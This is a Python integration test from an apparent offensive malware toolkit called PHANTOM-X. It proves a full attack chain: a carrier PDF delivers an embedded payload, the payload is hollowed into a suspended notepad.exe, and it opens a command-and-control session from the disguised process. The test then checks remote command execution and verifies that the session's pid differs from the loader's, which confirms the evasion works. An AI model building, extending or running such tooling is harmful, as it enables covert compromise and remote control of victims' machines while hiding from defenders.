#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: Phase 3 -- process-hollowing integration test
================================================================================
test_hollow_integration.py -- Prove the full hollowing chain:

    carrier PDF
      -> embedded PE extracted IN MEMORY
      -> target program created SUSPENDED
      -> target's original image unmapped from its address space
      -> payload image mapped in (headers, sections, relocations)
      -> payload imports resolved INSIDE THE TARGET
      -> payload started on a remote thread in the target
      -> C2 session established FROM THE TARGET PROCESS
      -> operator issues commands, receives real output
      -> controlled teardown

    The point of the test is the process identity: the session must come
    from the TARGET's pid, not from the loader's. That is what makes this
    hollowing rather than a plain loader.

USAGE
    python3 test_hollow_integration.py
    python3 test_hollow_integration.py --target "C:\\Windows\\System32\\notepad.exe"
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

from c2_server import C2Server  # noqa: E402

DEFAULT_PDF = os.path.join(ROOT, "phase1_pdf", "samples", "px_attack_chain.pdf")
DEFAULT_HOLLOW = os.path.join(ROOT, "phase3_fileless", "loader", "px_hollow.exe")


def wait_for_session(srv: C2Server, timeout: float = 60.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        with srv.session_lock:
            if srv.sessions:
                return list(srv.sessions.values())[0]
        time.sleep(0.1)
    return None


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Process hollowing integration test")
    ap.add_argument("--pdf", default=DEFAULT_PDF)
    ap.add_argument("--hollow", default=DEFAULT_HOLLOW)
    ap.add_argument("--target", default="C:\\windows\\system32\\notepad.exe",
                    help="program to hollow (the tool starts it itself)")
    ap.add_argument("--port", type=int, default=9701)
    ap.add_argument("--json", default=None)
    args = ap.parse_args(argv)

    pdf = os.path.abspath(args.pdf)
    hollow = os.path.abspath(args.hollow)
    for p in (pdf, hollow):
        if not os.path.exists(p):
            print(f"error: not found: {p}", file=sys.stderr)
            return 2

    if sys.platform.startswith("linux"):
        cmdline = f'wine "{hollow}" "{args.target}" "{pdf}"'
    else:
        cmdline = f'"{hollow}" "{args.target}" "{pdf}"'

    print("=" * 74)
    print("PHANTOM-X :: PROCESS HOLLOWING INTEGRATION TEST")
    print("=" * 74)
    print(f"pdf     : {pdf}")
    print(f"hollow  : {hollow}")
    print(f"target  : {args.target}")
    print(f"command : {cmdline}")
    print()

    srv = C2Server("127.0.0.1", args.port, "/tmp/px_hollow_itest.jsonl",
                   console=False)
    threading.Thread(target=srv.start, daemon=True).start()
    time.sleep(1.0)

    env = dict(os.environ)
    env["PX_C2_HOST"] = "127.0.0.1"
    env["PX_C2_PORT"] = str(args.port)

    proc = subprocess.Popen(cmdline, shell=True, env=env,
                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            text=True)
    res = {"started_utc": datetime.now(timezone.utc).isoformat(),
           "pdf": pdf, "target": args.target, "command": cmdline, "checks": []}

    def check(name, ok, detail=""):
        res["checks"].append({"name": name, "pass": bool(ok), "detail": str(detail)})
        print(f"  [{'PASS' if ok else 'FAIL'}] {name}" + (f" -- {detail}" if detail else ""))
        return ok

    ok = True
    try:
        sess = wait_for_session(srv, timeout=90)
        ok &= check("payload established a C2 session", sess is not None,
                    f"session={sess.id}" if sess else "no session")
        if sess:
            # The session exists as soon as the socket is accepted; the HELLO
            # line may arrive a moment later. Wait for it rather than
            # racing it.
            for _ in range(50):
                if sess.host not in (None, "", "?"):
                    break
                time.sleep(0.1)
            ok &= check("HELLO parsed", sess.host not in (None, "?", ""),
                        f"host={sess.host} arch={sess.arch} pid={sess.pid}")

            lat = srv.measure_latency(sess, timeout=15)
            ok &= check("latency measured", lat is not None,
                        f"{lat:.2f} ms" if lat is not None else "no PONG")

            for cmd in ("cmd /c echo PHANTOM_X_HOLLOW_PROOF", "cmd /c tasklist"):
                r = srv.exec(sess, cmd, timeout=30)
                out = (r or {}).get("output", "").strip()
                ok &= check(f"EXEC {cmd!r} returned output", r is not None and out != "",
                            repr(out[:100]))
                if "HOLLOW_PROOF" in cmd:
                    ok &= check("command output is correct",
                                "PHANTOM_X_HOLLOW_PROOF" in out, repr(out[:100]))

            # The session must belong to the hollowed process, not the loader.
            try:
                loader_pid = proc.pid
            except Exception:
                loader_pid = None
            ok &= check("session pid differs from the loader pid",
                        sess.pid not in (None, "", str(loader_pid)),
                        f"session pid={sess.pid} loader pid={loader_pid}")

            srv.audit.write("test_terminate", session=sess.id)
            sess.send("EXIT")
            for _ in range(60):
                if not sess.alive:
                    break
                time.sleep(0.1)
            ok &= check("controlled session termination", not sess.alive,
                        "payload acknowledged EXIT")
    finally:
        # The child may leave grandchildren holding the stdout pipe, so a
        # bare communicate() can block forever. Bound every wait.
        out = ""
        try:
            proc.terminate()
        except Exception:
            pass
        try:
            out, _ = proc.communicate(timeout=8)
        except subprocess.TimeoutExpired:
            try:
                proc.kill()
            except Exception:
                pass
            try:
                out, _ = proc.communicate(timeout=5)
            except Exception:
                out = ""
        except Exception:
            out = ""
        res["loader_stdout"] = out[-6000:]
        srv.running = False
        try:
            srv.shutdown()
        except Exception:
            pass

    res["finished_utc"] = datetime.now(timezone.utc).isoformat()
    res["result"] = "pass" if ok else "fail"

    print()
    print("-" * 74)
    print(f"RESULT: {'PASS' if ok else 'FAIL'}")
    print("-" * 74)
    print("Chain proven: PDF -> extract -> hollow a target process -> payload")
    print("runs AS that process -> C2 -> command execution -> controlled exit.")

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(res, fh, indent=2)
        print(f"\n[+] JSON written: {os.path.abspath(args.json)}")

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
